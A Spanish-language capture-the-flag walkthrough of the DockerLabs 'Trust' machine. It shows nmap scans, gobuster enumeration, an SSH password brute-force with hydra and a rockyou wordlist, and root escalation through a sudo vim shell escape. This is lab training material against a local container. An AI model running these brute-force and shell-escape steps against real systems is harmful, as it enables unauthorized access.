#MAQUINA #DOCKERLABS #MUY_FACIL 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Trust** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.18.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.18.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 12:47 CET
Initiating ARP Ping Scan at 12:47
Scanning 172.18.0.2 [1 port]
Completed ARP Ping Scan at 12:47, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:47
Scanning 172.18.0.2 [65535 ports]
Discovered open port 80/tcp on 172.18.0.2
Discovered open port 22/tcp on 172.18.0.2
Completed SYN Stealth Scan at 12:47, 0.55s elapsed (65535 total ports)
Nmap scan report for 172.18.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2024-11-23 12:47:49 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:12:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.18.0.2                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 12:48 CET
Nmap scan report for 172.18.0.2
Host is up (0.000015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect res


```

   ```bash

nmap --script="http-enum" 172.18.0.2                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-23 12:49 CET
Nmap scan report for 172.18.0.2
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Usamos **gobuster** para enumerar posibles directorios y/o recursos:

   ```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Podemos ver un **secret.php** , que tiene lo siguiente :

   ```bash
Hola Mario,
Esta web no se puede hackear.
```

Posible usuario -> **mario**

# EXPLOTACION

Usamos **hydra** para intentar sacar su contraseña:

   ```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-23 12:51:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-23 12:51:37


```
**usuario : mario**
**contraseña: chocolate**
# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
mario@6b9963b9da16:~$ sudo -l
Matching Defaults entries for mario on 6b9963b9da16:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 6b9963b9da16:
    (ALL) /usr/bin/vim

```

Vemos **vim** con permisos SUDO :
   ```bash
mario@6b9963b9da16:~$ sudo vim -c ':!/bin/sh'
# whoami
root
# 
```

**YA ESTAMOS COMO ROOT.**
